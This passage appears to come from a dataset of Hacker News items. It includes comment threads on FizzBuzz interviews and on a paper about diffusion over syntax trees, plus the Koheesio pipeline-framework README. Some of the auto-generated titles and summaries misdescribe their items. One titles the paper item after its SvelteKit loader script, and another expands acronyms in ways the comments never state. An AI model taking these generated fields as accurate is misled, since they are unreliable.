discuss their solution in depth would have been a good countermeasure? To some degree. But not everyone communicates as well as they code or vice versa, and then it comes to what you're trying to qualify. reply sjaak 10 hours agorootparentprevI've also used FizzBuzz at several companies, and the insane amount of people it filters out continues to boggle my mind. reply arethuza 8 hours agorootparentI once froze in an interview when asked a simple technical question - I'd been giving a presentation for an hour on how to launch a new product and I was asked by the CEO how to do something technically trivial - my brain could not do it. So he probably thought I was some marketeer pretending to be technical - which isn't really true. I suspect quite a lot of people who are labelled as \"can't code\" are freezing like I did. reply ownagefool 4 hours agorootparentI suspect some do, and some will be a lot when you bunch them all together. However, counter point, I've had people forced on me through much of my career who just can't code for the most part, and despite being pretty reasonable about it ( it's part of the nature of the work I do ), I'm very rarely surprised by competency. reply sjaak 8 hours agorootparentprevWhen I ask people to code FizzBuzz I: - give them ~30 minutes on their own machine - they get to pick the language they code in - I leave the room for large parts of it - I bring them a drink - I tell them I want to see what they can do and that I don't care if they complete it - permit them to search on the internet (as long as they don't copy/paste a solution) I see this usually: - they finish in a few minutes - they just can't do it, even with hints reply arethuza 8 hours agorootparentYes that sounds pretty sensible. Do you ever have a conversation with these people as to why they think they couldn't do it? reply johnnyanmac 7 hours agorootparentprev> permit them to search on the internet really? they get 30 minutes + internet and they couldn't google \"javascript how to get divisible by 3\"? That's just bad research at that point. reply hcrean 7 hours agorootparentprevI failed FizzBuzz the first time someone gave it to me in an interview... The specific failure was that I first attempted to solve by using repeated subtraction. The guy kept asking me to \"solve it a different way\", or saying \"there is a better way to solve this\". I tried using arithmetic tables, I tried using results about base10 remainders and I even tried using one of the corollaries to Fermat's little theorem to speed it up for larger inputs... every time I was told I was getting it wrong because \"there was a better solution\". In the end he pointed out that the only solution he would accept was use of the mod operator. Since then I have actively kept a tally: I naturally use the mod operator an average of twice a calendar year, it has always been in personal life code when dealing with complicated geometry problems, the bit of code containing it almost always fails on some edgecase because at the point of using mod it is convoluted. reply johnnyanmac 7 hours agorootparentHonestly sounds like a bad interviewer. repeated subtraction is a good first step and I would try to push more if that was the first implementation. But If you could derive a base 10 remainder you know conceptually what problem the mod operator is trying to solve. a % b = a - (b * a/b) /assuming a sane language with integer division, else cast a/b to int/ Figuring the above operation (or getting close) is when you should more or less pass, and That's a good point to show the interviewee what the operation is. That should be the point of an interview problem, to show the thought process, not that you know fancy tricks. But alas, I was shown an XOR swap in an interview last week and spent 3 minutes deriving it on paper instead of 3 seconds saying \"oh yeah, a => b and b => a\" to a trick that I haven't seen since college some decade ago. The current market loves tricksters, I suppose. And yes, the actual real world use of modulo is surprisingly sparse, despite easily imagining situations where you could use it. reply vaylian 7 hours agorootparentprevFizzBuzz is a highly artificial problem. It makes sense that people who are not familiar with it will assume that there is an elegant solution. But in the end the right approach is to be very boring and to notice that you need to check for divisibility with 15 before you check for divisibility with 3 and 5. reply bluGill 5 hours agorootparentFizzBuzz is a problem that doesn't have an elegant solution. That is the point: to see how you approach the problem. (there are 3 possible solutions, each in-elegant in their own way) reply ryandrake 1 hour agorootparentI don't like FizzBuzz because it over-weights the interviewees knowledge of the relatively obscure modulo operator. Yes, there are other ways to do it, but the expectation of FizzBuzz is that the candidate has that \"Eureka\" moment and remembers modulo. If I need a \"Non-Programmer Weed Out\" question, I'd rather give a problem that is 1. as easy as FizzBuzz, but 2. is just 'if' statements and loops and cannot be solved by knowledge of a particular operator (or bit twiddling tricks). reply CoastalCoder 5 hours agorootparentprevSome years ago I was remotely interviewing at Google, and I was asked to code up the reversal of a linked list. But my brain just froze. This is something I can easily solve in 5-10 minutes, correctly handling every plausible corner-case. I'm curious how common this is, statistically speaking. I'm also curious how it correlates with other things about the interviewee. reply XorNot 10 hours agorootparentprevDo you tell them what the \"mod\" operator is before giving it? The failure rate of FizzBuzz has always struck me as depending on the idea that you can do a lot of programming and just never need that operator. reply arethuza 8 hours agorootparentI once worked with a guy who was an incredibly good developer and I was surprised when he didn't see anything special about the number 64 (i.e. a power of two) - turns out that he'd never done any bit fiddling type work so he hadn't had to think in those terms. It wouldn't surprise me if a lot of people hadn't heard of \"mod\" either.... reply dkdbejwi383 7 hours agorootparentA huge majority of programming work is basically just CRUD stuff and other data shuffling. It’s not surprising that someone wouldn’t have needed to work with big shifting (or modulus) in that case. reply arethuza 7 hours agorootparentHe was an expert in complex multi-organisation enterprise integration and was the go to guy to work out why horrific distributed transactions were failing... He also did a lot of cool stuff as side projects in his own time - just none of them happened to involve worrying about powers of 2. reply azornathogron 9 hours agorootparentprevYou don't actually need mod to do fizzbuzz, even if that's the most obvious way for people who know what mod is. But without any \"real\" math at all you can do it with, eg, two counters and some if statements. Or if you recognise that there's a repeating pattern you can work out that pattern manually and just write code to emit it over and over. reply eschneider 9 hours agorootparentprevEven if that's so, modulus (or at least the concept of remainders) are elementary school math and any competent programmer could bang together an (inefficient) modulus operator in a few minutes. So even in a language w/o a mod operator, it's not a hard problem if you understand how to solve problems with code. reply daemin 7 hours agorootparentprevUnless you specifically want a compiling and running version of FizzBuzz you don't actually need to use or know about the mod operator. At least for me it would be sufficient if the person used a function like IsMultipleOf(x, m), or Remainder(x, n). This would at least make it clear what the function did even if they didn't get the exact operator. The other thing to note is that the mod operator works differently on different languages and platforms. reply DonHopkins 6 hours agorootparent> the mod operator works differently on different languages and platforms Not with positive inputs, which is the domain of FizzBuzz. Even if you don't know what \"mod\" means, if you have no idea know what a remainder is, and that the problem calls for it, and you can't derive the mod operator using integer addition, subtraction, multiplication, and division, then your math and problem solving skills are pretty weak, which FizzBuzz tests. reply ownagefool 4 hours agorootparentprevI stopped using fizz buzz a long time ago. 90% of candidates can't define a 2d array in their chosen language without first filtering the candidates, where you get to about 50%. reply sjaak 8 hours agorootparentprevNo but I permit internet access as long as they don't search for the solution (I trust them not to do that, and don't monitor what they do) reply DonHopkins 6 hours agorootparentYou're too trusting. reply ownagefool 4 hours agorootparentWhilst I agree, his point still stands that either they do it fast or never. reply sensanaty 9 hours agorootparentprevYeah I know how to implement FizzBuzz since it's such a meme, but I've basically never used the mod operator in real code. Maybe it comes up in more math-y code I suppose, but for most backend/frontend/SQL code I've never reached for it. reply wruza 8 hours agorootparentfor (…) { heavy_op(); if (i % 100 == 0) { printf(\"not dead\"); } Classic reply vundercind 8 hours agorootparentprevI’ve used it for coloring alternating lines differently in UI code, and as a lazy way to log only every so many times some loop runs. I only know it well because it was covered near the beginning of one of the first programming books I picked up (on Perl 5) and it stuck with me because it seemed wild to me that they had an operator for that. reply stefan_ 9 hours agorootparentprevMore mathy code like checking if a number is even or splitting a total number of seconds into minutes and seconds? reply kmoser 5 hours agorootparentprevDepends on the application. I've written accounting software that makes use of it, along with heavy use of floor() and ceil(), including in SQL. reply piva00 9 hours agorootparentprevSame experience, used FizzBuzz at many places and always got surprised by the amount of people it can filter. The best interview process I've ever ran at a company consisted of a basic FizzBuzz for about 15-30 min followed by a pairing session no longer than 1h30m on a problem that could get as tricky as we wanted to assess their skill level",
    "originSummary": [
      "The author criticizes Leetcode-style interviews, arguing they don't accurately reflect the real responsibilities of a software engineering job.",
      "Despite advice from experienced engineers that memorizing easily searchable information is unnecessary, these interviews still focus on such trivia.",
      "The author, experienced in AWS, Kubernetes, and Ruby on Rails, calls for more practical assessments and invites job offers that don't rely on such quizzes."
    ],
    "commentSummary": [
      "The discussion critiques LeetCode-style interviews for being stressful but effective at filtering out unqualified candidates, though their ability to assess true technical talent is debated.",
      "Alternatives like simpler coding challenges, pair programming, and practical problem-solving tasks are suggested to better evaluate candidates' abilities and fit.",
      "Concerns about the fairness and effectiveness of standardized technical interviews, especially in high-paying tech companies, are raised, with some advocating for more job-relevant assessments."
    ],
    "points": 396,
    "commentCount": 500,
    "retryCount": 0,
    "time": 1717483671
  },
  {
    "id": 40569531,
    "title": "SvelteKit App Initialization: Setting Base URL and Asynchronous Module Import",
    "originLink": "https://tree-diffusion.github.io/",
    "originBody": "{__sveltekit_1hc3cqg = { base: new URL(\".\", location).pathname.slice(0, -1)};const element = document.currentScript.parentElement;Promise.all([ import(\"./_app/immutable/entry/start.D_J-uX4U.js\"), import(\"./_app/immutable/entry/app.DYSSwME5.js\")]).then(([kit, app]) => { kit.start(app, element);}); }",
    "commentLink": "https://news.ycombinator.com/item?id=40569531",
    "commentBody": "Diffusion on syntax trees for program synthesis (tree-diffusion.github.io)359 points by pouwerkerk 18 hours agohidepastfavorite83 comments zelphirkalt 13 hours agoThis sounds more similar to what people have done with Racket and hint generation for MOOCs. Not sure which university it is again, but I saw a presentation about how they generate hints for students by mutating the syntax tree and analyzing how they had to modify it, to get to a target solution. It was presented at some RacketCon, maybe a decade ago already. Perhaps that knowledge how to do it can be combined with newer machine learning approaches? EDIT: I found the talk: https://invidious.baczek.me/watch?v=ijyFC36kVis reply pmayrgundter 17 hours agoprevIt's funny, this kind of subtree mutation was looked at pretty deeply by Koza and Adamı in the 90s under the rubric of Genetic Algorithms, but with a slightly different optimization function One ref in the paper to 2000 for GAs for fast generation of program trees, but that's missing the main show Hope they're reading this and dig into those guys work reply pmayrgundter 56 minutes agoparentOn my last comment I suggested the authors may not be familiar with Koza+Adami, but didn't realize the corresponding author is Stuart Russell, co-author of \"Artificial Intelligence: A Modern Approach\", with Peter Norvig.. the \"The authoritative, most-used AI textbook, adopted by over 1500 schools.\" according to their site. https://aima.cs.berkeley.edu/ Whoops! reply verdverm 15 hours agoparentprevSome more recent alternatives to Koza's GP use some very different search mechanisms. FFX & PGE are both very fast. https://seminars.math.binghamton.edu/ComboSem/worm-chiu.pge_... https://arxiv.org/pdf/2209.09675 I authored PGE and have thought that RL, and more recently diffusion techniques, might help these algos. All of the algos need better ways to guide the search, or help it get unstuck from local optima, which happens surprisingly fast. Most work in GP / EVO is about avoiding premature convergence. reply vidarh 5 hours agoparentprevGenetic Programming [1], specifically. I have both his two bricks from '92 and '94 (Genetic Programming: On the Programming of Computers by Means of Natural Selection, and Genetic Programming II : Automatic Discovery of Reusable Programs). I've not read his two later ones. The big problem they seemed to get stuck at was partially doing it fast enough, and partially ending up with a result that was comprehensible. The latter in particular seems to be far better with LLMs. You tended to end up spending a lot of time trying to reorganise and prune trees to get something that you could decipher, and so it seemed like the primary, and too limited, value became algorithms where you could invest a lot of resources into trying to find more optimal versions of very small/compact algorithms you could justify spending time on. But the challenged there is that there are often so many far lower hanging fruits in most code bases that few people get to the point where it's worth trying. I still love the idea at a conceptual level... [1] https://www.genetic-programming.com/johnkoza.html reply sandos 8 hours agoparentprevWow, what a flash from the past! Was playing around a LOT with GP around that time, and the name Koza is certainly familiar. I even think I did some semi-similar things, instead of my normal approach which was simplistic but inefficient in that lots of invalid code was generated. reply tithe 16 hours agoparentprevAre these the references? - https://web.archive.org/web/20021224053225/http://smi-web.st... - https://www.genetic-programming.com/jkpdf/tr1314.pdf reply teruakohatu 11 hours agoparentprevThese kind of Genetic Algorithms are still being researched in academia. I attended a seminar a couple of years ago on the subject. It’s still a total dead end imho. reply Chabsff 4 hours agorootparentI used to (early 00s) be super big into GA and GP until a professor of mine at the time described the whole class of algorithms as \"Marginally better than brute forcing\". That really resonated with my experience, and was just too spot-on to ignore. reply bionhoward 1 hour agorootparentGP finds good working trees for complex real world problems in a single night on a consumer GPU which you would definitely need to brute force for (millions of) years to find. Quite a margin! reply 29athrowaway 17 hours agoparentprevYou can also say backpropagation is the chain rule from centuries ago. reply pmayrgundter 1 hour agorootparentI totally didn't realize this until these comments. Neat! I went digging in wikipedia.. the Backpropagation article was created in 2005 and yet the mention of association/derivation from the chain rule wasn't mentioned until 2014, through a borrow from the German article https://en.wikipedia.org/w/index.php?title=Backpropagation&o... reply telotortium 14 hours agorootparentprevIt is a computationally clever application of the chain rule to minimize the amount of computation needed to compute gradients for all parameters in the network. reply om8 12 hours agorootparent> to minimize the amount of computation IMO backprop is the most trivial implementation of differentiation in neural networks. Do you know an easier way to compute gradients with larger overhead? If so, please share it. reply QuadmasterXLII 8 hours agorootparentMy first forays into making neural networks used replacement rules to modify an expression tree until all the “D” operators went away, but that takes exponential complexity in network depth if you aren’t careful. Finite differences is linear in number of parameters, as is differentiation by Dual Numbers reply Jensson 3 hours agorootparentprevYou can do forward propagation. Humans typically finds forward easier than backwards. reply tripzilch 2 hours agorootparentprevsince you asked ... how about Monte Carlo with Gibbs sampling? reply eli_gottlieb 3 hours agorootparentprevBackprop is the application of dynamic programming to the chain rule for total derivatives, which sounds trivial only in retrospect. reply elijahbenizzy 15 hours agorootparentprevBackpropogration is just an application of the chain rule -- cool that we all learned it in high school! reply goexploration 10 minutes agoprevThe beam search idea is interesting. Curious to know if beam search for reverse diffusion has been done before. Could anyone clarify how they integrate beam search with the reverse diffusion- do they sample m > k nodes from a reverse diffusion step and expand only the top k nodes? reply JHonaker 5 hours agoprevMarkov Chain Monte Carlo for program synthesis isn't exactly novel. The most immediate reference I thought of is Josh Tenenbaum's [1]. There's also a lot of demos in WebPPL (web probabilistic programming language)[2] like [3] for the synthesis of 3D space-ships. I highly recommend their associated books on The Design and Implementation of Probabilistic Programming Languages [4] and Probabilistic Models of Cognition [5]. I also highly recommend taking a look at the publications of the MIT Probabilistic Computing Project [6]. [1] Human-level concept learning through probabilistic program induction. https://www.cs.cmu.edu/~rsalakhu/papers/LakeEtAl2015Science.... [2] http://webppl.org/ [3] https://dritchie.github.io/web-procmod/ [4] https://dippl.org/ [5] http://probmods.org/ [6] http://probcomp.csail.mit.edu/ reply can16358p 9 hours agoprevI wonder how this would apply to compiler/interpreter optimizations. Is it possible that it can \"disect\" some parts of the execution, perhaps at assembly level, and come up with optimizations specific to the compiled code without changing the output (I mean expected program output, not emitted binary), that modern compilers have not deterministically come up with? reply gergo_barany 18 minutes agoparentThis is called superoptimization: https://en.wikipedia.org/wiki/Superoptimization There are people applying synthesis techniques to superoptimization. So something like this would possibly apply. reply bastawhiz 3 hours agoparentprevI expect the answer is \"no\". I wouldn't expect a tool like this to \"discover\" assembly without being trained on the compiled output. The model has no notion of how or where the code runs. After decades of compiler research and super compilers chugging away, we're sort of at a point where discovering novel optimizations with results that are more than a smidge of improvement is almost impossibly unlikely. Compilers today are really good. That said, I think the value that something like this might have is being able to optimize the intent of the code. If it can determine that I'm sorting some numbers, it can rewrite my code to use a faster sorting algorithm that has the same functional properties. If I'm storing data that never gets used, it can stop storing it. It has a view of the code at a level above what the compiler sees, with an understanding not just of what is being done, but why. reply xavxav 1 hour agorootparent> After decades of compiler research and super compilers chugging away, we're sort of at a point where discovering novel optimizations with results that are more than a smidge of improvement is almost impossibly unlikely. Compilers today are really good. I agree when it comes to peephole optimizations, but there's still a lot of juice left in exploiting language guarantees (immutability, non-aliasing, data-parallelism), however most compiler developer energy is spent propping up C/C++ and consequently optimizations are developed with those languages in mind. reply dinobones 16 hours agoprevI don't understand the \"magic\" here. In a traditional approach, you would generate random images, calculate some distance metric, then use some optimization method like simulated annealing to minimize the distance. I get that the difference between the image representations is being optimzied here, but how is it possible that changing tokens in a program is differentiable? reply revalo 16 hours agoparentChanging tokens in a program is not differentiable. For me, the key idea is that you can train a neural model to suggest edits to programs by randomly mutating nodes. And when you run this neural model, you get to make edits that are syntactically correct (i.e., a number will only replace a number etc.) according to a context-free grammar. reply whereismyacc 9 hours agoprevThere's been talk in the past about github adding integrations with common build tools (automatically?). What if you could compile every llvm-compiled project on github and run a diffusion model over the intermediate representations? reply daralthus 7 hours agoparentwhat's the output? reply whereismyacc 6 hours agorootparentI guess the output would be an llvm intermediate representation that you can compile down and run, right? I'm stretching pretty far past my knowledge here. reply Philpax 6 hours agorootparentI think the question - at least, for me - is \"what do you expect to do with this system?\" What will you output with your diffusion model? reply ofou 59 minutes agoprevHere's a GPTo summary of the paper https://www.emergentmind.com/papers/2405.20519 reply gastonmorixe 14 hours agoprevcould diffusion work at binary level? I mean, could we train a diffusion model to generate a final binary of a program given a prompt? probably AST may be better but the binary I feel is extremely easy to at least test fast if it works or not. Though there may be a lot of drawbacks, if this is possible I can't wait until we ask \"give me an app that does that\" and the diffusion model starts generating all te bytes the app to do the job. Just wondering reply fulafel 13 hours agoparentEditing with feedback from program output, like in this work, could be more closely applicable if you first disassemble the binary and have it edit things in the assembly language AST, then reassemble. This would result in a higher likelihood of creating a valid program. reply dcreater 13 hours agoparentprevThat would be mind blowing. Why go through all the lost intermediary steps, especially through Python and JS, when you can generate machine code directly reply eternauta3k 13 hours agorootparentIf your model is error-prone, having control structures, types and other compile-time checks is very valuable. It's harder to constrain arbitrary machine code to make something sensible. reply mejutoco 11 hours agorootparentIntuitively it makes sense, but I am not fully convinced about this. You could give it only a few register and discard invalid operations for certain registers or plain known invalid operations. reply treyd 6 hours agorootparentBut that doesn't stop it from generating code that segfaults. reply mejutoco 4 hours agorootparentThat is the same problem as generating python that blows up, no? (assuming it is tested in a sandbox) reply treyd 13 hours agorootparentprevInterpretability, reasoning about the generated code, portability, etc. Probably also demands a larger model with a higher cost of training (and likely more training data) to target a more unstructured \"language\" like machine code. reply lwansbrough 12 hours agoprevI’d like to see it with SDFs! reply grondilu 9 hours agoparentPlease elaborate. Are you thinking of approximating the distance function with an algebraic expression, with algebra itself being the \"programming language\"? reply Philpax 6 hours agorootparentYou can represent arbitrary shapes through the composition of SDFs: https://iquilezles.org/articles/distfunctions/ These can be treated as parameterised nodes in a tree, similar to what's happening here. It follows that there may be a possible adaptation of this to SDF composition, such that you can give it a shape and have it produce the SDF nodes + composition required to produce that shape. Most existing approaches to SDFs with NNs have the NN itself take on the role of the SDF (i.e. given a point, it predicts the distance), so there's a compelling opportunity here to build a system that can produce spatial representations from existing imagery without NN inference at render-time. I imagine adding the third dimension to the problem makes it much harder, though! I'll have to give the paper a read to determine how coupled to 2D their current approach is. reply flakiness 12 hours agoprevThe PDF is super slow to render, I guess because it contains commands from programmatically generated figures. It gives it a kind of an academic-paper-feel I miss these days. https://arxiv.org/pdf/2405.20519 reply grondilu 10 hours agoprevThe application to graphics is interesting. It seems to me that current image generation models struggle with stylized pictures (\"ligne claire\" in comics, geometric shapes and so on). After all this kinds of pictures should be easy to encode in vectoriel formats (like SVG), which are basically programming languages. reply machiaweliczny 9 hours agoprevI had idea about doing something similar based on DifussER paper. One would need to model code edits as algebra similar to add char, replace char or delete char but something like define func, remove func, define var etc. I am undereducated to do it myself but have a feeling it could work. reply machiaweliczny 9 hours agoparentI will have to dig into this paper as it looks like exactly this. I wonder if they use closures to limit valid operations space. The only thing I didn’t understand to make it happen was how to connect it well to description of desired program or edit. BTW my idea was to train it by destructing programs available on github (so adding noise via some random valid ops and then removing it to retrieve original program). Probably best done in N-1 commit is treated as noise and moving back to commit 0 reply sakras 17 hours agoprevThis is very cool! My first thought is: can this be applied to converting raster graphics to vector graphics (eg PNG to SVG)? Seems like a very similar problem, though probably much more computationally expensive. reply szvsw 17 hours agoparent> We apply our approach to inverse graphics tasks, where our model learns to convert images into programs that produce those images. I would argue that at least on a philosophical level, this is, definitionally, the process of converting raster graphics to vector graphics, as long as you by the premise that the difference between the two is simply that vector gfx is a programmatic/imperative representation of image generation, while raster is a data structure/declarative representation of images. In other words, simply put, raster images are just arrays, vector images are sequences of instructions. Raster images are naturally much closer to the “raw” data needed by the output mechanism, while vector images require a much more complex interpreter. reply adrianmonk 17 hours agorootparentOr, raster and vector images are philosophically the same thing. The only difference is that vector has more operations than raster. Raster just has \"draw unit square at integer coordinates\". reply DougBTX 13 hours agorootparentOn the other hand, A Pixel Is Not A Little Square[0] would disagree, a raster is a grid sample of a continuous function. [0] http://alvyray.com/Memos/CG/Microsoft/6_pixel.pdf reply code_biologist 12 hours agorootparentThough I agree with the point that paper makes (it makes a good case that the little square mental model of a pixel is mostly inappropriate) it does seem focused on imaging and does not mention places where the little square mental model is appropriate. Pictures of cats, subpixel rendered text, or company logo SVGs as displayed on a web page are point samples and not little squares. User interfaces are good examples of often being little squares. Calling HN's beige background a point sampled discrete representation of an underlying continuous function seems pretty tortured — to me it seems like a bunch of beige little squares. reply szvsw 16 hours agorootparentprevYep, I agree with this - tried to hint at that when I said “vector images require a much more complex interpreter”. reply andybak 10 hours agorootparentprev> vector gfx is a programmatic/imperative representation of image generation, while raster is a data structure/declarative representation of images. This seems a bit off to me. Aside from oddities such as Postscript, most vector formats are canonical examples of declarative code. The distinction is more about what is being represented rather than how it is represented. reply montyanderson 16 hours agoprevThis is fascinating. I've been trying to envisage how the new language models will have deeper or lower-level role in software production than simple code generation. reply passion__desire 10 hours agoparentI think browsers could be the next iteration. Website backend will have premade flows. e.g. a transfer money from my account to another account, etc. And through fluidic UIs, the website will collect info need, necessary approvals before flow submission. AI-based browser DOM manipulation. reply aquarius0 13 hours agoprevThe application to inverse graphics tasks reminds me of this paper which was released one week earlier: https://arxiv.org/abs/2405.15306 reply pamelafox 16 hours agoprevI would love to see them try this with the Processing/P5Js libraries. Thats what the ASTs reminded me of. It could potentially be used to help students trying to figure out how to fix their programs. I used AST-based hints for my ProcessingJS courses on Khan Academy, but I handwrote the AST patterns for those hints. reply dwlg00 16 hours agoprevI'm failing to see how this is novel. It looks like they're doing diffusion on a representation system for 2D graphics, which is very different than an actual program (they do address this limitation to be fair) reply revalo 15 hours agoparentYeah, this is true! These are more like expressions rather than programs. We were mostly following the language used by previous work, https://arxiv.org/abs/1906.04604 reply hobofan 5 hours agorootparentCouldn't this be used to do HTML generation from designs? Especially when combined with multiple viewport sizes at the same time, generating a fluid HTML layout would be pretty awesome. reply artninja1988 15 hours agoprevSurprised to see Stuart Russells name on this as I thought he was fully consumed by the doomsday cult. Although he's last author so he's probably only on it because he's the head of the lab reply robxorb 11 hours agoparentWhat's with the last author/first author thing in science papers? I've read several times that the author listed last is usually the most significant contributor, and the first author the least significant, due to some kind of tradition around modesty plus favourably introducing new names. (Which then of course doesn't work, if everyone knows it's happening...) Here, you've interpreted it as the reverse, and by that I mean in the sensible way - did you not know about the tradition, or are you wrong? And how can we know either way for sure? reply fabian2k 10 hours agorootparentConventions vary by field, but within a specific field they're usually pretty consistent. In natural sciences (except large physics papers) the convention is that the first author is the one doing most of the practical work. The last author is the PI (principal investigator) of the group who had a hand in designing the experiments and oversaw the research. Now, the latter can mean anything from barely doing any work on the paper to being deeply involved in the research. If you're reading papers most of the time the last author is more meaningful to you because they're the senior researcher, you know their research interests and what kind of papers they produce. The first authors are PhD students and PostDocs, they change much more often. reply robxorb 7 hours agorootparentThank you, that makes my apparently half-formed prior understanding make a lot more sense. Seems the path forward is researching the greater context of the last authors work, and of course the common convention for each field. Eg, as a sibling commented this convention may not be common in ML research, I wonder then if it may be something less common in emergent fields where researchers are generally be younger and less likely to follow older traditions. reply optimalsolver 10 hours agorootparentprev>the author listed last is usually the most significant contributor Where did you read that? That's definitely not the case in machine learning. reply robxorb 6 hours agorootparentI've read it in several places over the years, and just had a search now to find a reference to cite. Here's a PubMed paper on the subject: https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3010799/ (And note how points 1 through 4 all quite conflict with each other!) reply pama 6 hours agorootparentIf it helps think of the first author as the lead engineer or the CEO, and the last author as the board or the VC. In some areas of science (or some teams) the last author is closer to a CEO, in others closer to a VC (they almost always have the powers of the board). This picture does not contradict the guideline in the reference you shared. Typically, most of the work and writing of the paper is done by the first author, though sometimes, for example when a student gives up, only most of the writing of the paper. The main ideas may be from the first author or from the last author, and rarely in between, but the sorting typically goes by amount of labor/contributions on the task. In some narrow subfields, including most math, sorting is alphabetical or random. reply ngruhn 14 hours agoparentprevI haven’t heard anyone make sane case against the doomsday argument. Only attacks. reply ImHereToVote 9 hours agorootparentYou can't be scared while you laugh at someone. So laughing is a good thing to do to stave of fear. reply samatman 15 hours agoparentprevA lot of doomers work on AI. While frowning, and shaking their heads very gravely, so you know they don't approve. reply optimalsolver 11 hours agorootparentIf we don't get to AGI first, the bad guys will. reply sgt101 8 hours agorootparenthang on, what if... we're the bad guys? reply behnamoh 15 hours agoprevHow is it different from genetic algorithms that mutate the syntax tree until the target output is achieved? reply Karellen 5 hours agoparentIt's different in the same way that using an LLM instead of a traditional Markov chain is a different way of generating text. You're still predicting the next word at a time to hopefully end up with plausible sentences/paragraphs, but the difference is in how you model the training dataset, and how you use that model to make each next choice in your live application. reply 17 hours agoprev[dupe] jmugan 14 hours agoprev [9 more] [flagged] revalo 14 hours agoparentIt's much easier to work with LISP. It's functional, trees are easy to reason about. We're using an even more simplified language in this work. It's kind of like the MNIST for progsynth research. Scaling this to real and useful programming languages and domains is still non-trivial, and is a major drawback of our work here. reply jmugan 14 hours agorootparentThanks for your response. I think I would even rather it be a limited subset of Python. But I seem to be in the minority here. Cool work! reply baq 14 hours agoparentprevS-expressions are basically an AST with minimal parsing. It’s very convenient to work with. reply jmugan 14 hours agorootparentYeah, that's basically my objection. The convenience seems to hide something important. I know you can write any program with LISP, but using LISP for this kind of thing seems to be a symptom of limited applicability. reply baq 12 hours agorootparentI don't share this concern. You can easily write Python, Typescript and C++ in S-expression format since you're basically writing an AST, that's the whole point. Conversion between one and the other is... maybe not trivial, but certainly not rocket science. E.g. https://hylang.org/ reply koito17 12 hours agorootparentNot to mention, there are languages with the same expressiveness as most Lisp-like languages. Dylan and Julia immediately come to mind. Julia in particular makes it easy to convert between code and syntax tree data, so you have arguably the same capabilities as Lisp macros, in a syntax that would appease GP's preferences. I think another big thing that makes Lisp-like languages (Common Lisp, Clojure, Racket, ...) convenient for this kind of work is the fact that everything is an expression. Having \"statements\" and \"expressions\" separate makes writing some programs awkward. I use Clojure at my day job, and the way I write code takes for granted that I can simply bind `foo` to the result of a `case` or an `if` without ad-hoc operators that have completely different syntax from their statement-equivalents. reply nabla9 13 hours agoparentprevConversion between s-expression and C, Java, Python syntax is trivial. Programming language syntax is just for humans and not relevant. Writing correct programs is all about semantics. reply ipsum2 14 hours agoparentprev [–] The model is written in Python. The intermediate language is an S-expression, its just an easy representation of a tree. An alternative could be JSON. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The code snippet initializes a SvelteKit application by setting the base URL and identifying the parent element of the current script.",
      "It then asynchronously imports and starts the SvelteKit application using the specified modules."
    ],
    "commentSummary": [
      "The discussion highlights the integration of syntax tree mutations in program synthesis with modern machine learning techniques, drawing parallels to genetic algorithms and hint generation.",
      "Recent advancements like FFX (Fast Function Extraction) and PGE (Probabilistic Grammar-based Evolution) are noted as faster alternatives to traditional methods, addressing challenges like subtree mutation and premature convergence.",
      "The conversation also explores advanced optimization tools beyond current compiler capabilities, including neural models, diffusion techniques, and the feasibility of training diffusion models to generate executable binaries."
    ],
    "points": 359,
    "commentCount": 83,
    "retryCount": 0,
    "time": 1717462347
  },
  {
    "id": 40570892,
    "title": "Nike Unveils Koheesio: A Python Framework for Advanced Data Pipelines",
    "originLink": "https://github.com/Nike-Inc/koheesio",
    "originBody": "Koheesio CI/CDPackageMetaKoheesio, named after the Finnish word for cohesion, is a robust Python framework for building efficient data pipelines. It promotes modularity and collaboration, enabling the creation of complex pipelines from simple, reusable components. The framework is versatile, aiming to support multiple implementations and working seamlessly with various data processing libraries or frameworks. This ensures that Koheesio can handle any data processing task, regardless of the underlying technology or data scale. Koheesio uses Pydantic for strong typing, data validation, and settings management, ensuring a high level of type safety and structured configurations within pipeline components. Koheesio's goal is to ensure predictable pipeline execution through a solid foundation of well-tested code and a rich set of features, making it an excellent choice for developers and organizations seeking to build robust and adaptable Data Pipelines. What sets Koheesio apart from other libraries?\" Koheesio encapsulates years of data engineering expertise, fostering a collaborative and innovative community. While similar libraries exist, Koheesio's focus on data pipelines, integration with PySpark, and specific design for tasks like data transformation, ETL jobs, data validation, and large-scale data processing sets it apart. Koheesio aims to provide a rich set of features including readers, writers, and transformations for any type of Data processing. Koheesio is not in competition with other libraries. Its aim is to offer wide-ranging support and focus on utility in a multitude of scenarios. Our preference is for integration, not competition... We invite contributions from all, promoting collaboration and innovation in the data engineering community. Koheesio Core Components Here are the key components included in Koheesio: Step: This is the fundamental unit of work in Koheesio. It represents a single operation in a data pipeline, taking in inputs and producing outputs. ┌─────────┐ ┌──────────────────┐ ┌──────────┐ │ Input 1 │───────▶│ ├───────▶│ Output 1 │ └─────────┘ │ │ └────√─────┘ │ │ ┌─────────┐ │ │ ┌──────────┐ │ Input 2 │───────▶│ Step │───────▶│ Output 2 │ └─────────┘ │ │ └──────────┘ │ │ ┌─────────┐ │ │ ┌──────────┐ │ Input 3 │───────▶│ ├───────▶│ Output 3 │ └─────────┘ └──────────────────┘ └──────────┘ Context: This is a configuration class used to set up the environment for a Task. It can be used to share variables across tasks and adapt the behavior of a Task based on its environment. Logger: This is a class for logging messages at different levels. Installation You can install Koheesio using either pip or poetry. Using Pip To install Koheesio using pip, run the following command in your terminal: pip install koheesio Using Hatch If you're using Hatch for package management, you can add Koheesio to your project by simply adding koheesio to your pyproject.toml. [dependencies] koheesio = \"\" Using Poetry If you're using poetry for package management, you can add Koheesio to your project with the following command: poetry add koheesio or add the following line to your pyproject.toml (under [tool.poetry.dependencies]), making sure to replace ... with the version you want to have installed: koheesio = {version = \"...\"} Features Koheesio also provides some additional features that can be useful in certain scenarios. These include: Spark Expectations: Available through the koheesio.steps.integration.spark.dq.spark_expectations module; Installable through the se extra. SE Provides Data Quality checks for Spark DataFrames. For more information, refer to the Spark Expectations docs. Box: Available through the koheesio.steps.integration.box module Installable through the box extra. Box is a cloud content management and file sharing service for businesses. SFTP: Available through the koheesio.steps.integration.spark.sftp module; Installable through the sftp extra. SFTP is a network protocol used for secure file transfer over a secure shell. Note: Some of the steps require extra dependencies. See the Features section for additional info. Extras can be done by adding features=['name_of_the_extra'] to the toml entry mentioned above Contributing How to Contribute We welcome contributions to our project! Here's a brief overview of our development process: Code Standards: We use pylint, black, and mypy to maintain code standards. Please ensure your code passes these checks by running make check. No errors or warnings should be reported 